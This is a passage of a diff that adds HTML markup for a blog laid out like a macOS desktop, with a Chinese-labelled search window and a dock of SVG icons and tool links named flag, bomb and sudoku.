+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+    <div class="window-title">聚焦搜索</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body search-body">
+      <div class="search-input-wrap">
+        <input id="search-input" class="search-input" type="search" placeholder="搜索文章..." autocomplete="off">
+        <span class="search-hint">⌘K</span>
+      </div>
+      <ul id="search-results" class="search-results"></ul>
+      <div id="search-empty" class="search-empty">未找到结果</div>
+    </div>
+  </div>
+</section>
+
+  <div class="dock">
+  <div class="dock-inner">
+    <span class="dock-item app finder">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M4 6.5c0-1.4 1.1-2.5 2.5-2.5h11c1.4 0 2.5 1.1 2.5 2.5v11c0 1.4-1.1 2.5-2.5 2.5h-11C5.1 20 4 18.9 4 17.5z"/>
+          <path d="M12 4v16"/>
+          <circle cx="9" cy="10" r="1" fill="currentColor"/>
+          <circle cx="15" cy="10" r="1" fill="currentColor"/>
+          <path d="M8.5 14.5c1 1 2.1 1.5 3.5 1.5s2.5-.5 3.5-1.5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Finder</span>
+    </span>
+    <a class="dock-item app spotlight" href="#search">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="11" cy="11" r="5.5"/>
+          <path d="M15.5 15.5L20 20"/>
+        </svg>
+      </span>
+      <span class="dock-label">聚焦搜索</span>
+    </a>
+    <a class="dock-item app notes" href="#notes">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <rect x="5" y="4.5" width="14" height="15" rx="2"/>
+          <path d="M8 8h8M8 11.5h8M8 15h5"/>
+        </svg>
+      </span>
+      <span class="dock-label">文章清单</span>
+    </a>
+    <span class="dock-item app safari">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="12" cy="12" r="8"/>
+          <path d="M12 7l2.8 5.2-5.2 2.8z"/>
+        </svg>
+      </span>
+      <span class="dock-label">Safari</span>
+    </span>
+    <a class="dock-item app music" href="#music">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M9 18a2.5 2.5 0 1 0 0-5"/>
+          <path d="M9 13V6l9-2v7"/>
+          <path d="M16 16a2.5 2.5 0 1 0 0-5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Music</span>
+    </a>
+    <span class="dock-item app trash">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M6 8h12l-1 11H7z"/>
+          <path d="M9 8V5h6v3M5 8h14"/>
+        </svg>
+      </span>
+      <span class="dock-label">Trash</span>
+    </span>
+    <span class="dock-divider"></span>
+    
+    
+      
+      <a class="dock-item tool" href="#tool-flag">
+        <span class="dock-icon">
+          <span class="tool-letter">F</span>
+        </span>
+        <span class="dock-label">flag</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-bomb">
+        <span class="dock-icon">
+          <span class="tool-letter">B</span>
+        </span>
+        <span class="dock-label">bomb</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-sudoku">
+        <span class="dock-icon">
+          <span class="tool-letter">S</span>
+        </span>
+        <span class="dock-label">sudoku</span>
+      </a>
+    
+  </div>
+</div>
+
+
+  <!-- embed resize script removed: fixed-height iframe -->
+</body>
+</html>
